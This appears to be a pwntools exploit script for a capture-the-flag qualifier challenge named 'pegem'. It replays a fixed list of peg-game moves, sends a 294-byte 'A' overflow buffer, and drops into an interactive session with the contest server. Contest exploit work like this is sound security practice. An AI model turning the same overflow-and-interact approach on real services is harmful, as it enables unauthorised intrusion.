from pwn import *

moves = [ "Da", "Fd", "Af", "Gb", "Jc", "Le", "Mf", "Bi", "Cj", "Of", "Fm", "Nl", "Km", "Gb",
					"Ad", "Ig", "Ch", "Gb", "Jc", "Le", "Bi", "Nl", "Km", "Mf", "Cj", "Of", "Jc", "Af",
					"Hj", "Bi", "Gb", "Jc", "Ne", "Ch", "Ln", "Om", "Md", "Bg", "Kd", "Ad", "Fa", "Df",
					"Jc", "Af", "Md", "Gb", "Om", "Ln", "Ne", "Fd", "Bg", "Kd", "Le", "Jh", "Bi", "Cj",
					"Gb", "Ad", "Nl", "Dm", "Ln", "Of", "Fm", "Nl", "Km", "Af", "Da", "Fd", "Gb", "Ad",
					"Le", "Df", "Jc", "Nl", "Km", "Mf", "Cj", "Of", "Bg", "Fd", "Af", "Gb", "Jc", "Le",
					"Mf", "Bi", "Cj", "Of", "Fm", "Nl", "Km", "Ch", "Jc", "Mf", "Cj", "Gi", "Bg", "Kd",
					"Om", "Ln", "Ne", "Df", "Jc", "Af", "Bi", "Gb", "Le", "Ch", "Jc", "Af", "Nl", "Fm",
					"Ln", "Om", "Md", "Bg", "Kd", "Cj", "Df", "Ad", "Gb", "Jc", "Le", "Mf", "Bi", "Cj",
					"Of", "Fm", "Nl", "Km", "Dk", "Ad", "Ig", "Ch", "Gb", "Jc", "Le", "Bi", "Nl", "Km",
					"Mf", "Cj", "Of", "Nl", "Dm", "Ad", "Ch", "Gb", "Jc", "Le", "Mf", "Cj", "Of", "Fd",
					"Bg", "Kd", "Dm", "Ad", "Ch", "Gb", "Jc", "Le", "Mf", "Bi", "Cj", "Of", "Fm", "Nl",
					"Km", "Ln", "Dm", "Ad", "Ch", "Gb", "Jc", "Md", "Bg", "Kd", "Ne", "Df", "Cj", "Of",
					"Fo", "Af", "Hj", "Bi", "Gb", "Jc", "Ne", "Ch", "Ln", "Om", "Md", "Bg", "Kd" ]

useremote = "remote" in sys.argv
#filename = "./emulator"
filename = "./pegem"
if useremote:
	p = remote("pegem_d144a0fa24a0fc17809d4f56600bc740.quals.shallweplayaga.me", 1234)
else:
	p = process("./a.out")

# context.log_level = 'debug'

if 1==0: #not useremote and not "nogdb" in sy.argv:
	gdb.attach(p, '''
	set disassembly-flavor intel
	handle SIGALRM nopass nostop noprint
	set height 0
	c
	''')

output = ""
for move in moves:
	# output += p.readuntil(":")
	p.writeline(move)

	# print p.clean()

# p.writeline("A"*1000)
p.writeline("A"*294)
#p.writeline("0"*293 + 3*p8(0))
output += p.clean()

print 'Got ',output


p.interactive()
